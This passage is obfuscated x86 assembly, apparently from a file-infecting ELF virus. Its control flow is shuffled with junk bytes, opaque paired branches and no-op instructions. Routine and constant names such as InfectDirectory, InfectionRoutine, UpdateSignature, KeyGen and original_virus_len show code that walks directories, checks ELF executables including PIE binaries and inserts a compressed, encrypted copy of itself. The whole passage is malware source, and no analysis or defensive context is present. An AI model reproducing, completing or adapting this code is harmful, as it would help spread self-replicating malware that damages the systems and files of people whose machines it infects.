    mov         r1, [rsp+_INFFILE_OFF.file+file.fileptr]
    jmp         ..@9Mc1iuwoM5O9
..@uAauQVc93ul4:
    mov         m6, rax
    jmp         $+3
db 0xca
    jmp         ..@5QHSC3N75wpP
..@dsVKHAm6030X:
    pop         rsi
    jmp         $+4
db 0x58, 0x8f
    jmp         $+5
db 0x71, 0x4d, 0xa7
    jmp         ..@CxyFkBDJ5AKa
..@eeBeOQlObxsy:
    mov         r2, m5
    jmp         $+4
db 0x95, 0x88
    jb          ..@ZuYDAtsr4mt1
    jae         ..@ZuYDAtsr4mt1
..@poKj9oSizyw1:
%ifdef X86_32
    mov         rcx, rcx
%endif
    jmp         ..@ZCvpjoZ8EGPE
..@HKqTcKE7Y8IT:
    xor         rax, rax
    jmp         $+4
db 0x52, 0x35
    jb          ..@RLOW2QsFLtdZ
    jae         ..@RLOW2QsFLtdZ
..@eChFGO7hQms6:
    call        WORDToDWORDASCII
    jmp         $+5
db 0x2f, 0x97, 0x58
    jmp         ..@JkurIbLTuVu8
..@hgBalbL1wGVu:
    mov         rax, rax
    jmp         $+3
db 0x2b
    jmp         ..@6tmbtNToRJRR
..@ZknpstkO3ZeF:
    call_vsp    ExitProgram
    jb          ..@5aRH8gdQroMJ
    jae         ..@5aRH8gdQroMJ
..@wvdBtWTbIMeO:
    xor         rdx, rdx
    jmp         $+4
db 0x88, 0xb2
    jmp         $+3
db 0xf3
    jmp         $+4
db 0x23, 0xb9
    jmp         $+5
db 0xed, 0x5e, 0x7e
    jmp         ..@hIHJ14N4sz4E
Memset:
    jmp         ..@XtMf9PG24cap
..@OS5T7Xuorw5n:
    rep         nop
    jmp         $+5
db 0xd3, 0x0f, 0xfa
    je          ..@VMvg5P5SsBvx
    jne         ..@VMvg5P5SsBvx
..@NiAZofUI75Nz:
    xchg        rax, rax
    jb          ..@kak2jcwKq1BK
    jae         ..@kak2jcwKq1BK
..@elqLqqTrS90H:
    jl          ..@Y9rFEYwCCZHN
    jmp         ..@BzOiYAFZmAiZ
..@MSAN1Avr2DEZ:
    mov         rdx, rdx
    jmp         ..@siYLJzMi7Xpz
..@APci3ddKfU3E:
    jnz         ..@dl4gpgDPIm6V
    jmp         $+4
db 0x22, 0x26
    jb          ..@vuknWryhvFkk
    jae         ..@vuknWryhvFkk
..@LXm66oa0ORRv:
    xchg        rdx, rdx
    jmp         ..@avQQVdFnvH8t
..@LihWzGTbjo5U:
    call_vsp    Strlen
    jmp         $+3
db 0xc1
    je          ..@iZ6I5qoyLJbZ
    jne         ..@iZ6I5qoyLJbZ
..@89HPwtve2abX:
    cmp         BYTE [r2], 0x0
    jl          ..@1nf7yoqFUJAh
    jge         ..@1nf7yoqFUJAh
..@8jE1fNvGou2l:
    call        NonBinaryFile
    jmp         $+3
db 0x8b
    jmp         $+5
db 0x1b, 0x77, 0x55
    jmp         $+5
db 0x8d, 0x16, 0xbf
    js          ..@CBIcGp0MaIFP
    jns         ..@CBIcGp0MaIFP
..@4rlqnvWWYEm5:
    push        rcx
    jmp         $+5
db 0xc9, 0xd1, 0x23
    jl          ..@gePpk3uO7row
    jge         ..@gePpk3uO7row
..@vjBlFCHNAyu1:
    call        Strcpy
    jmp         ..@sLKDvtmaFMqW
..@nzVnzAZHFHmo:
    cmp         BYTE [r1+16], ET_DYN
    jmp         $+3
db 0x60
    jmp         $+5
db 0x51, 0x2a, 0xd0
    jmp         $+3
db 0x32
    jl          ..@G8H8Gw9SD6fW
    jge         ..@G8H8Gw9SD6fW
..@7V4h4lGj4qHc:
    syscall
    jmp         $+3
db 0x6d
    jmp         ..@EDR6iNcRqE4E
..@xSBHsdaicW8v:
    cmp         al, 0x0
    jl          ..@sya0Wym4vySJ
    jge         ..@sya0Wym4vySJ
..@GbRiYMZ7gJ6Y:
    xchg        rax, rax
    jmp         $+4
db 0x29, 0x14
    je          ..@bNVjAun3tljh
    jne         ..@bNVjAun3tljh
..@fi3ykJlqGxYF:
    mov         rbp, rbp
    jmp         $+4
db 0x10, 0x73
    jmp         ..@0KgPfZxPY5YK
..@RJtMkGrrZRow:
%ifdef X86_64
    mov         rbp, rbp
%endif
    jmp         $+3
db 0xfb
    jl          ..@kS3gHZ4pikOG
    jge         ..@kS3gHZ4pikOG
..@xbx2BH2a1jQl:
    mov         DWORD [rsp+_PROC_OFF.filefd], eax
    jmp         $+3
db 0xe8
    jb          ..@GV01BkvFxOLk
    jae         ..@GV01BkvFxOLk
..@0eqlF4ase7zJ:
    rep         nop
    jmp         $+4
db 0x8f, 0x5a
    jmp         ..@yXw7gWdp4NhQ
..@shiTzSgl1Bgb:
    mov         rax, (-1)
    jmp         $+3
db 0x57
    jmp         ..@d4DsYOmCqSci
..@GHt1XsPNNxZ6:
    test        rax, rax
    jmp         ..@7OYvsRl4c3Dd
..@I2IN09QItmHU:
    push        rax
    jl          ..@6S4K3Y4uQAtg
    jge         ..@6S4K3Y4uQAtg
..@H7coQXlbN5QZ:
    xchg        rsp, rsp
    jmp         ..@PhrE7rpcNERJ
..@DkSw2oztTRce:
    pop         rbx
    jmp         $+5
db 0x76, 0xd9, 0x56
    jmp         $+5
db 0xe1, 0x7e, 0x38
    jmp         ..@nUR9kBy2ouYw
..@yv7nSl33KAvv:
    rep         movsd
    jmp         $+3
db 0xda
    je          ..@dK5NH7iF9hG6
    jne         ..@dK5NH7iF9hG6
..@WDdXAOTc1bNF:
    mov         rcx, rcx
    jmp         ..@KTYMj68w7aK0
..@00MpPBU6Mo8S:
    mov         rsp, rsp
    je          ..@QOzlSNFcVAem
    jne         ..@QOzlSNFcVAem
..@IWZ7eEX7xwZI:
    xchg        rdi, rdi
    jmp         $+4
db 0x82, 0x53
    jmp         $+5
db 0xe8, 0xe2, 0x0c
    jmp         ..@FBqrKO1PaYja
..@JWcg1RrNBEco:
    syscall
    jmp         $+4
db 0x00, 0xbc
    js          ..@cX8OWYyIh509
    jns         ..@cX8OWYyIh509
..@1RbiSxWG3uSD:
    mov         m7, rdi
    jmp         $+4
db 0x74, 0x09
    jmp         ..@GJwgRBuVyajO
..@6tmbtNToRJRR:
    xor         rax, rax
    jmp         $+4
db 0x44, 0x8f
    je          ..@qtxdBnPrTYRD
    jne         ..@qtxdBnPrTYRD
..@6Qdg2SZE0TtR:
    pop         rsi
    jmp         $+5
db 0xb1, 0x6b, 0x9e
    je          ..@RCwUNDzm7gck
    jne         ..@RCwUNDzm7gck
..@V1l1CpjqiRo7:
    push        rcx
    jmp         $+3
db 0x70
    js          ..@lnF5Tfg7oNsn
    jns         ..@lnF5Tfg7oNsn
..@BXl611OnY5HP:
    mov         QWORD [rsp+_LZSSE_OFF.inputaddr], r1
    jmp         ..@Bb0EyIs9ndEo
..@LlGkq8xAA2f6:
    add         r5, 1
    jmp         $+3
db 0x1c
    jb          ..@YkfHa2IZREXI
    jae         ..@YkfHa2IZREXI
..@17XweaKqbi44:
    cmp         BYTE [r1], 0x30
    jmp         $+5
db 0x3c, 0xc1, 0x0c
    jmp         $+3
db 0x7b
    jmp         ..@qSrV3qRaefZg
..@vvyrvD1IZIDl:
    mov         ecx, WINDOW_LENGTH-LOOKAHEAD_LENGTH 
    jb          ..@3S8zJ6i6gUuJ
    jae         ..@3S8zJ6i6gUuJ
..@katpGgmJOcay:
    mov         [rsp+_LZSSE_OFF.inputaddr], rsi
    jmp         $+4
db 0x3d, 0xc5
    jb          ..@4m6CD1hUe7FO
    jae         ..@4m6CD1hUe7FO
..@fgPmYYOYDfbA:
    mov         rbx, rbx
    jmp         $+4
db 0xce, 0xc9
    jmp         ..@NOwfXC0HwWkT
..@LMUfztqqxrPA:
%ifdef X86_32
    mov         ecx, original_virus_len+PADDING
%endif
    jmp         $+4
db 0x4a, 0x52
    jmp         ..@ApJOWecePGOB
..@BeNvE8ogJMGg:
    push        rdx
    jmp         $+3
db 0x96
    je          ..@zHljI7k4xMLQ
    jne         ..@zHljI7k4xMLQ
..@oMOMQfQtRbaI:
    pop         rax
    je          ..@3rVUyAasntLA
    jne         ..@3rVUyAasntLA
..@3trSjVcbvTs3:
    je          ..@U0GWr8zeoBO9
    jmp         $+3
db 0xad
    jmp         $+4
db 0xaf, 0x0a
    js          ..@EF9ZX9IfoIjw
    jns         ..@EF9ZX9IfoIjw
..@Z5tbhDb8xMnU:
    pop         rsi
    jl          ..@rFX37u9qjjQJ
    jge         ..@rFX37u9qjjQJ
..@TiRMvuSUqkdU:
    pop         rcx
    jl          ..@qxfmQsvP2cJ0
    jge         ..@qxfmQsvP2cJ0
..@s1yQLLrf8aQm:
    syscall
    jmp         ..@YxDQNlGaOZyR
..@T1LeFHZ3sxEf:
%ifdef X86_64
    pop         rsi
%endif
    jmp         $+3
db 0xbb
    jmp         $+4
db 0x7a, 0x65
    js          ..@ZYjEYZqE3Ec9
    jns         ..@ZYjEYZqE3Ec9
..@69GXSiwGbrtl:
    add         rdi, rax
    jmp         ..@fGc6p1JwlUyj
..@UbjYMaYQliNk:
    mov         rcx, rcx
    jb          ..@JLMZUfA1gA7d
    jae         ..@JLMZUfA1gA7d
..@Xj1Zi60w8Dff:
    pop         rbx
    jmp         $+4
db 0x38, 0x6c
    jmp         ..@MmNSku9S44To
..@fKaxGJ6OI2Il:
    push        rbx
    jmp         $+4
db 0xee, 0xd9
    js          ..@Cl5LslPkwhTo
    jns         ..@Cl5LslPkwhTo
..@b5UhdaVdDZ9S:
    push        rsi
    jmp         $+3
db 0xa9
    jmp         ..@TjJehnsHF0gv
..@k1kI90mZK85K:
    mov         rbp, rbp
    jb          ..@YxZtoBTzoEDs
    jae         ..@YxZtoBTzoEDs
..@x1yap4PY08cP:
    mov         rax, SYS_FORK
    jmp         $+3
db 0xf8
    jmp         $+5
db 0xc7, 0xb3, 0x5f
    jmp         $+3
db 0x48
    jmp         ..@ugix70Ojfxmw
..@dUoZjXQUkXyY:
    mov         rax, rax
    jb          ..@CkkW2SeuFUkF
    jae         ..@CkkW2SeuFUkF
..@9fjHaBbhrUA3:
    mov         rsi, QWORD [rsp+_DYNPIE_OFF.ptr]
    jl          ..@tSNL5HPRkrMj
    jge         ..@tSNL5HPRkrMj
..@bMGFzYwb8TDt:
    xchg        rcx, rcx
    js          ..@Wi3ioR4vWxB9
    jns         ..@Wi3ioR4vWxB9
..@jH9oswpI0EGo:
    push        rdi
    jmp         ..@P0GmZVp9QLTC
..@atA4OZlF9b0G:
    mov         rsp, rsp
    jb          ..@0Z4kYjfh3zBQ
    jae         ..@0Z4kYjfh3zBQ
..@LthSUach36Y1:
    jnz         ..@f316IYTgUszI
    jmp         ..@eer4RX078fex
..@gUidQ96OBJDa:
%ifdef X86_32
    pop         rbx
%endif
    jmp         ..@hc3de2wEZ48B
..@pgTtfgID61lc:
    call        UnmapFile
    jmp         ..@esr5FN1NZtwi
..@EWeimIZ5zLaT:
    mov         r3, QWORD [rsp+_INFFILE_OFF.file+file.filesize]
    js          ..@PUmp0aEXr5vF
    jns         ..@PUmp0aEXr5vF
..@Mlmhi8jAXTLP:
    push        rsi
    jmp         $+5
db 0x99, 0x06, 0xd7
    jmp         ..@6YWPdURdmz4q
..@YqpdimuTlOGi:
    mov         rax, rax
    jmp         $+3
db 0x2e
    jmp         $+5
db 0x10, 0x8a, 0x7e
    js          ..@Ypxn5ibJqqP4
    jns         ..@Ypxn5ibJqqP4
..@oaxiz9P1zwMf:
    mov         BYTE [rsp+_LZSSE_OFF.bits], 0x00
    jmp         ..@ChAByiL0OiCs
..@HerZVKaQvXS6:
    cmp         rax, 0x00
    jmp         $+4
db 0x38, 0xf1
    jmp         ..@mUeoB5XRYXRk
..@96mSKUX0PfZE:
    mov         r1, QWORD [r5+file.fileptr]
    js          ..@FwImWnDR3LkJ
    jns         ..@FwImWnDR3LkJ
..@JbhC7J3XmP1G:
    rep         nop
    jmp         ..@l56XmNOqKMjG
..@t01oNKCUYPww:
    cmp         eax, 0x0
    jmp         $+4
db 0x00, 0xbf
    js          ..@1WYHR1jUIupt
    jns         ..@1WYHR1jUIupt
..@PAVAxFja0pas:
    push        rdi
    jmp         $+5
db 0x2e, 0x76, 0x93
    jl          ..@cUVVjyyRbUEM
    jge         ..@cUVVjyyRbUEM
..@iMGkxgnIOSmL:
    call_vsp    Strncmp
    jmp         $+4
db 0xef, 0xac
    jb          ..@iFxS10ukX02c
    jae         ..@iFxS10ukX02c
..@LytTfmzFYnf5:
    cmp         cl, 0x4
    jmp         $+5
db 0xfb, 0xb6, 0x12
    jb          ..@kdRidtYDY6H5
    jae         ..@kdRidtYDY6H5
..@CKSWPJMlS0EJ:
    pop         rcx
    jmp         $+4
db 0x87, 0x18
    jmp         $+3
db 0x40
    jmp         ..@ZcSOejOliDMy
..@KTBRnsK6aqxD:
    xchg        rax, rax
    jmp         $+3
db 0xa8
    jmp         $+3
db 0x3d
    jl          ..@5G5lXuZMjCxD
    jge         ..@5G5lXuZMjCxD
..@43jcOPIWUWBO:
    pop         r2
    jmp         ..@8NQB15QyJrPP
..@XtMf9PG24cap:
    mov         rsp, rsp
    jl          ..@xSm6FmSefEDV
    jge         ..@xSm6FmSefEDV
..@FwImWnDR3LkJ:
    mov         r2, QWORD [r1+e_h.e_entry]
    jmp         ..@pQA3FxRP3BpM
..@T3fc3DsE27hf:
    cmp         r4, QWORD [rsp+_INFDIR_OFF.dirnread]
    jb          ..@leNunFjoYziw
    jae         ..@leNunFjoYziw
..@NQ18RfnYWraG:
    mov         r2d, DWORD [r1]
    jmp         $+5
db 0x59, 0x00, 0xf5
    jb          ..@oHY9uXdS0Rf1
    jae         ..@oHY9uXdS0Rf1
..@x5BG3Nt7Gboc:
    pop         rbx
    jmp         $+5
db 0x2d, 0x17, 0x5d
    jb          ..@CpztpskN7ePk
    jae         ..@CpztpskN7ePk
..@FkBsRYSx40DP:
    push        rbx
    jmp         ..@YRkaWd9FTPXx
..@cTzxoOuMrHa2:
    add         r1, r4
    jmp         ..@sf2BzOkylmw9
..@vb1awg91meXl:
    push        rax
    jmp         ..@x1FD9nOnmTtY
..@Phl9dEofPHmq:
    pop         rbx
    jmp         $+3
db 0xde
    jl          ..@v3WcxWTcUQGr
    jge         ..@v3WcxWTcUQGr
..@JLMZUfA1gA7d:
    push        rdx
    jmp         $+5
db 0x01, 0xd8, 0xa3
    jl          ..@299kkscFTKln
    jge         ..@299kkscFTKln
..@eTLTlwWbZYmY:
    je          ..@pNPTFSmxvxEF
    jmp         $+3
db 0x0b
    jb          ..@uVUdFPmh4dP3
    jae         ..@uVUdFPmh4dP3
..@HLguscHUFApy:
%ifdef X86_32
    mov         edi, r1
%endif
    jmp         $+4
db 0xc1, 0x12
    jl          ..@fcnXiMVH1MvK
    jge         ..@fcnXiMVH1MvK
..@L6LizbSahhQZ:
    mov         rbp, rbp
    jmp         ..@WcpjgTw1XFiU
MemMove:
    jmp         ..@miL8j4nqehFM
..@jBiemNfnZzDG:
    push        rdi
    jmp         $+5
db 0x74, 0x9f, 0x48
    js          ..@l05c70saXi1B
    jns         ..@l05c70saXi1B
..@VriBhlq6vdf2:
    mov         rax, rax
    jmp         $+4
db 0x8f, 0xe2
    js          ..@0DMQjmnpt9vI
    jns         ..@0DMQjmnpt9vI
UpdateSignature:
    jmp         ..@mrlbUB1entT9
..@Xa0QsT7M7B3C:
    push        rcx
    jmp         $+3
db 0x48
    jb          ..@uJrf4HrgO2Da
    jae         ..@uJrf4HrgO2Da
..@xEJk30IuzDTw:
    cmp         QWORD m7, 0x00
    jmp         $+4
db 0x32, 0x17
    jl          ..@OCaGB2fXAZwr
    jge         ..@OCaGB2fXAZwr
..@YXy02v28BkCW:
    push        rdi
    jl          ..@9giCm4dYTdlz
    jge         ..@9giCm4dYTdlz
..@29UcL16wkAca:
    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
    je          ..@onx4a3ZalHl3
    jne         ..@onx4a3ZalHl3
..@voEyG3b02KGB:
    mov         eax, SYS_MUNMAP
    jmp         ..@K0ic8nwgiWYV
..@XXFTV54Ku5ZI:
    add         r1, e_h.e_shentsize
    jmp         $+3
db 0xbc
    jmp         ..@U8A72LDEGHU3
..@fJaJMcpZGeyV:
    push        rcx
    jmp         $+3
db 0xb2
    js          ..@dCVp8c0Q8yQb
    jns         ..@dCVp8c0Q8yQb
..@0JWI84NzcYIc:
    cmovg       ecx, DWORD [rsp+_LZSSE_OFF.length]
    jmp         $+3
db 0xf7
    jl          ..@Ame4Ls2dfw1i
    jge         ..@Ame4Ls2dfw1i
..@0BCVPe4afGNf:
    xchg        rsi, rsi
    jmp         $+5
db 0x7e, 0x68, 0xc1
    jmp         $+5
db 0x76, 0x5b, 0x63
    je          ..@jCu1xLJBtpS2
    jne         ..@jCu1xLJBtpS2
..@6WAjl4ZqNPzG:
    mov         r3, rax
    js          ..@lcWZIivLWJxz
    jns         ..@lcWZIivLWJxz
..@6nhO7DLfa0FV:
    pop         rax
    jmp         $+3
db 0x2f
    jmp         $+3
db 0x50
    je          ..@NMHKtqVxR4UW
    jne         ..@NMHKtqVxR4UW
..@RAhpzuEFG2oe:
    cmovg       ecx, DWORD [rsp+_LZSSE_OFF.length]
    je          ..@TZBgL4tKYlTx
    jne         ..@TZBgL4tKYlTx
..@hpgRjibpfGrB:
    push        rsi
    jb          ..@aFNiZjtkG5Fb
    jae         ..@aFNiZjtkG5Fb
..@OyDN0ZaK09vT:
    mov         rax, rax
    jmp         ..@zK6ak41vUC3W
..@1zGH6gTgeiU6:
%ifdef X86_64
    mov         eax, SYS_MMAP
%endif
    jmp         ..@yiw384EcjA9B
..@eYUrg9FWeouT:
    xchg        rcx, rcx
    jmp         $+3
db 0x4d
    jmp         ..@CV82TCRqEbKO
..@ZpgeKVdHcfy6:
    pop         rax
    jmp         $+5
db 0xb9, 0x5d, 0x56
    jmp         $+4
db 0x1b, 0x9f
    jmp         $+3
db 0x4e
    jb          ..@B8w6R73tCpKR
    jae         ..@B8w6R73tCpKR
..@S1upbwh7XvKL:
    xchg        rbx, rbx
    jmp         $+3
db 0xcf
    js          ..@6lovXW5ExuDJ
    jns         ..@6lovXW5ExuDJ
..@yXakaUAUhlH4:
    mov         rax, QWORD [rsp+_LZSSE_OFF.outputaddr]
    jmp         ..@e3OElBBIQoje
..@e0FkeGu9Gg8S:
    call        KeyGen
    jmp         $+4
db 0x6a, 0x3a
    je          ..@TpIBH4J0pW4I
    jne         ..@TpIBH4J0pW4I
..@dCVp8c0Q8yQb:
    pop         rcx
    jmp         $+4
db 0xd5, 0xc0
    jmp         ..@hjEhdqvI9UaV
..@aR4yfTFE0En5:
    push        rcx
    js          ..@OcTg4fL3acNb
    jns         ..@OcTg4fL3acNb
..@hLyO8mOXZsQX:
    mov         rcx, rcx
    jl          ..@7RRgCKaCVt1H
    jge         ..@7RRgCKaCVt1H
..@n8H7BSgMPqcQ:
    jl          ..@Y9rFEYwCCZHN
    jmp         $+5
db 0xc4, 0xa7, 0x95
    jmp         ..@SIdCitWAqhLb
..@d4DsYOmCqSci:
    push        rsi
    js          ..@mkklvPMWTZP1
    jns         ..@mkklvPMWTZP1
..@nW3gEL1evZNx:
    pop         rax
    jmp         $+5
db 0x59, 0x40, 0xfa
    jl          ..@aA1EJWx1Am44
    jge         ..@aA1EJWx1Am44
..@D55cQYoIMHDy:
    call        FileValidation
    jmp         $+4
db 0xfd, 0xf0
    jb          ..@1nI1UPs7H1lP
    jae         ..@1nI1UPs7H1lP
..@djL8PY3JK4Bc:
    push        rcx
    js          ..@9jm2j2gnd0DF
    jns         ..@9jm2j2gnd0DF
..@WuSftzfXCVe4:
    push        rbx
    js          ..@1bHcuoBg3pH6
    jns         ..@1bHcuoBg3pH6
..@mb6HlcAIRVJh:
    pop         r5
    jmp         $+4
db 0x6a, 0xf9
    jmp         ..@1i8sWhnPhcZW
..@KwhUOdJnNZ0c:
    xchg        rdx, rdx
    jmp         ..@2ZnmOuKongPB
..@kPlGaiH0yPSV:
    rep         nop
    jb          ..@brf7eWKVMYEi
    jae         ..@brf7eWKVMYEi
..@aAYRv65qalHL:
    push        rax
    jmp         $+5
db 0x22, 0xe8, 0x64
    jmp         $+5
db 0x5f, 0x76, 0x74
    jl          ..@otCsBPGjgLii
    jge         ..@otCsBPGjgLii
..@kCwUkoHkuoum:
    pop         rsi
    jmp         $+4
db 0x61, 0x3a
    jmp         $+3
db 0x4f
    js          ..@D9nzThNk4yGz
    jns         ..@D9nzThNk4yGz
..@yt3eLuqJsoBW:
    xchg        rax, rax
    jmp         $+5
db 0xc4, 0xb9, 0x92
    jmp         $+3
db 0x0a
    jmp         ..@oz49tbClRvoW
..@0On4fVOqOIbb:
    call        InfectDirectory
    jmp         $+4
db 0xbc, 0x28
    js          ..@Lin1T7NHUBcf
    jns         ..@Lin1T7NHUBcf
..@ykqgrewboLKF:
    add         rcx, 2*bytes
    jmp         $+3
db 0x41
    jmp         ..@i0Z0PpJNX71P
..@YFPVhp5tft7R:
    mov         rsp, rsp
    jb          ..@H6znhTZAMQTh
    jae         ..@H6znhTZAMQTh
..@MtZlgJ1Poe9q:
    xchg        rdi, rdi
    jmp         $+5
db 0xe3, 0xc1, 0xa6
    js          InfectionRoutine
    jns         InfectionRoutine
..@IFdV3gmC0MBg:
    push        rcx
    jmp         $+4
db 0x2f, 0x94
    js          ..@G7UcAslYyOL6
    jns         ..@G7UcAslYyOL6
..@gpjXjoJWtxxC:
    mov         rsi, rsi
    jb          ..@7IwhTSmwogbs
    jae         ..@7IwhTSmwogbs
..@sZSoHW3NUVpb:
    cmp         r5, QWORD [rsp+_VADDR_OFF.tmp_vaddr]
    jmp         $+4
db 0xe0, 0x66
    jmp         ..@RodA4L9SJLXz
..@NMHKtqVxR4UW:
    mov         QWORD [rsp+_VADDR_OFF.tmp_vaddr], r5
    jmp         $+3
db 0x7c
    jb          ..@Re2bNioTUUpb
    jae         ..@Re2bNioTUUpb
..@maFQXieF4OsY:
    pop         rcx
    jmp         $+3
db 0xe8
    jmp         $+5
db 0x8f, 0xf5, 0x4a
    jmp         ..@3mjJfaSxvTNV
..@75fB9iZomYp4:
    jmp         ..@aQ8XslzevZ5O
    jmp         $+4
db 0xc9, 0x57
    jl          ..@S62Xh7bVPxmn
    jge         ..@S62Xh7bVPxmn
..@YAR2UJEXOp2W:
    xor         rax, rax
    jmp         ..@4pUUjmChbMkP
..@yYhUbPKSvqcC:
    mov         QWORD [rsp+_AESE_OFF.length], r2
    jmp         $+4
db 0x24, 0xcc
    js          ..@hOWsgyqPpWHN
    jns         ..@hOWsgyqPpWHN
..@WfJk93ezAPhg:
    mov         QWORD [r5+file.filesize], 0x00
    jmp         ..@dHQaWM7c7Qp6
..@gx8YocP6ZaVR:
    xchg        rcx, rcx
    jmp         $+4
db 0x00, 0x66
    js          ..@wIAJGTgtErpO
    jns         ..@wIAJGTgtErpO
..@rh8Nlo10CAt4:
    pop         rbx
    jmp         $+3
db 0x64
    jb          ..@GuYeHm6EuzG5
    jae         ..@GuYeHm6EuzG5
..@AswsFdPVxkkI:
    xchg        rcx, rcx
    jl          ..@e2k0acQnjsfY
    jge         ..@e2k0acQnjsfY
..@ur2w69sw79wK:
    jnz         ..@6tXRev0uFGct
    jmp         $+3
db 0x48
    jl          ..@cMUi8uDGOQnx
    jge         ..@cMUi8uDGOQnx
..@almVf3sBgiLw:
    call        UpdateSignature
    jmp         $+3
db 0x35
    jmp         $+4
db 0x4b, 0xed
    jmp         $+4
db 0x4e, 0xd2
    js          ..@t1ibB9bxCdJg
    jns         ..@t1ibB9bxCdJg
..@Vy3iZSmiOLww:
%ifdef X86_32
    xchg        rdx, rdx
%endif
    jmp         ..@2u1nqEeqhq33
..@NOwfXC0HwWkT:
    mov         BYTE [rsp+_LZSSE_OFF.character], al
    jmp         $+4
db 0x53, 0xe7
    jmp         $+5
db 0x29, 0x77, 0x61
    jb          ..@ux2bX1dCg2xC
    jae         ..@ux2bX1dCg2xC
..@QDgpThQd9VV2:
    pop         rbx
    jl          ..@5LxU5qTnCAaD
    jge         ..@5LxU5qTnCAaD
..@kfq5uorqZ3Rs:
    push        rax
    jmp         $+5
db 0x90, 0x0f, 0xc1
    jl          ..@nW3gEL1evZNx
    jge         ..@nW3gEL1evZNx
..@l7XLzsJehcbN:
    xor         r2, r2
    jl          ..@1GL6orvEuv3i
    jge         ..@1GL6orvEuv3i
..@av6e4TGjAmu7:
    push        rcx
    jmp         $+4
db 0xcb, 0xef
    jmp         $+5
db 0x6a, 0x76, 0x46
    jmp         ..@AN5uewUDIYYA
..@CS2VW9Gt8vFe:
    pop         rdi
    jmp         $+5
db 0x6d, 0xc8, 0xe0
    je          ..@1sNu0NSA6RvY
    jne         ..@1sNu0NSA6RvY
..@hzeXZMPO3Xmo:
    pop         rbx
    jmp         $+4
db 0xe1, 0x56
    jmp         ..@JlnTteW9Y4ln
..@infJjc74d9YT:
    cmp         rax, 0x00
    jmp         ..@AqEoBMtF0XKn
..@i2lKI0j97rXO:
    mov         rsp, rsp
    jl          ..@TuWZ3r0bVC3k
    jge         ..@TuWZ3r0bVC3k
..@tfJr2jLdayjF:
    xchg        rdx, rdx
    je          ..@S1ioZuUrgK56
    jne         ..@S1ioZuUrgK56
..@wpIjG9FEhj3m:
    mov         r5, QWORD [r4+rax+p_h.p_vaddr]
    jmp         $+3
db 0x33
    jmp         ..@4ol0WIqvyi6G
..@YHtOO1W1ktF6:
    pop         rcx
    je          ..@EWeimIZ5zLaT
    jne         ..@EWeimIZ5zLaT
..@w1YgcC5FrxLR:
    add         rdi, 0x4
    jmp         $+3
db 0x8d
    jmp         $+4
db 0xf4, 0x24
    js          ..@kce5JPzRE6nI
    jns         ..@kce5JPzRE6nI
..@rzcOvnWDrhMF:
    jge         ..@KTbdTsOfdS0T
    je          ..@DHUmQHXJJwk9
    jne         ..@DHUmQHXJJwk9
..@fIZ90XOqWWKp:
    mov         r3d, 0x10
    jmp         $+3
db 0xa1
    jl          ..@6UylrRXL5DYQ
    jge         ..@6UylrRXL5DYQ
..@eJdzzwcfOUHC:
    pop         rax
    jb          ..@dbQ2gh7zt6Pg
    jae         ..@dbQ2gh7zt6Pg
..@dht8bpIDNjlu:
    sub         rsi, m6
    jmp         ..@8o9O6LZr4jZy
..@Kkhm1ryzn3kD:
    xor         rcx, rcx
    jmp         $+3
db 0x81
    jmp         ..@ooE7w92XR5uj
..@AqEoBMtF0XKn:
    push        rsi
    je          ..@RVt98gdrTG8A
    jne         ..@RVt98gdrTG8A
..@sya0Wym4vySJ:
    jl          ..@Y9rFEYwCCZHN
    jmp         $+3
db 0x64
    jmp         $+3
db 0xe3
    js          ..@hit5HsXCIgTA
    jns         ..@hit5HsXCIgTA
..@y0jFWVWPkvNO:
    xor         r2, r2
    je          ..@Dtm7n342aH4P
    jne         ..@Dtm7n342aH4P
..@fDUKw5aGIOll:
    mov         r2, m8
    jl          ..@jspkDEek0pmB
    jge         ..@jspkDEek0pmB
..@SknhZWS2CtP8:
    pop         rdi
    jb          ..@lraZaB3Q8hAW
    jae         ..@lraZaB3Q8hAW
..@L8ZeSgu7PrCd:
    xor         rax, rax
    jmp         $+3
db 0xa9
    jmp         $+4
db 0xea, 0xb0
    jmp         ..@ieFfOyteZo2j
..@q43qFnMahb1C:
%ifdef X86_64
    mov         edx, 11b
%endif
    je          ..@Nfx6kaeVOCD8
    jne         ..@Nfx6kaeVOCD8
..@QCKxRcWaTfO0:
    mov         rdi, QWORD [rsp+_DYNPIE_OFF.sh_ptr]
    jmp         $+3
db 0x85
    jmp         ..@jqvdzfck1EBI
..@3i9IIoRIvt1j:
    xor         r2, r2
    jmp         $+3
db 0xca
    jl          ..@mwXmhRdA4ZiR
    jge         ..@mwXmhRdA4ZiR
..@4xCYkV5odblt:
    pop         rbx
    jmp         $+5
db 0xa0, 0xc0, 0x0b
    jmp         ..@93fI968gTwk4
..@Rm21rPbS6TyU:
    pop         r3
    jmp         $+5
db 0x69, 0x05, 0xec
    jmp         ..@9pFq20ggMjwY
..@uNWPjhxMHwkg:
    add         rsi, QWORD [rdi+s_h.sh_offset]
    js          ..@HpOSjS7dkPGz
    jns         ..@HpOSjS7dkPGz
..@v5CyJp6Toobg:
%ifdef X86_64
    mov         rbx, rbx
%endif
    jmp         $+3
db 0x72
    jmp         $+4
db 0x67, 0x6c
    jmp         ..@E91f00J6Wz5x
..@JXIdZY8XgkdG:
    mov         r1, m6
    jl          ..@KEqUTN940LRw
    jge         ..@KEqUTN940LRw
..@nZ8KZUC16k9C:
    pop         rdx
    jmp         ..@HWvXid0BOsDx
..@6tXRev0uFGct:
    push        rbx
    jmp         $+3
db 0xb8
    js          ..@Tzssvcf1WATA
    jns         ..@Tzssvcf1WATA
..@kMlcWhuBFvt9:
    pop         rsi
    jl          ..@HK2Qcix5p6kh
    jge         ..@HK2Qcix5p6kh
..@Pz3xCMBAvZbp:
    mov         rcx, rcx
    jmp         $+3
db 0xa5
    jl          ..@lJPoCDhQK5DR
    jge         ..@lJPoCDhQK5DR
..@Zwz3VFwxlhFy:
    mov         rbp, rbp
    jmp         $+5
db 0x33, 0xa8, 0xa0
    jmp         ..@dsVKHAm6030X
..@9Ry4aEkCgjOu:
    mov         rdi, m6
    jmp         $+4
db 0xe4, 0x94
    jmp         $+3
db 0x0c
    jmp         ..@zlf7LZvfAIHd
..@STHAYEqI97Ns:
    mov         BYTE [rsp+_LZSSE_OFF.match_len], dl
    jmp         $+3
db 0x34
    jmp         $+3
db 0xf5
    js          ..@GuWIh8qm4zMg
    jns         ..@GuWIh8qm4zMg
..@TXxlFR5E7s1p:
    pop         rdx
    jmp         $+3
db 0x2a
    jb          ..@ua5QTjVb1BG8
    jae         ..@ua5QTjVb1BG8
..@yQvseKVgtE0r:
    mov         rsi, rsi
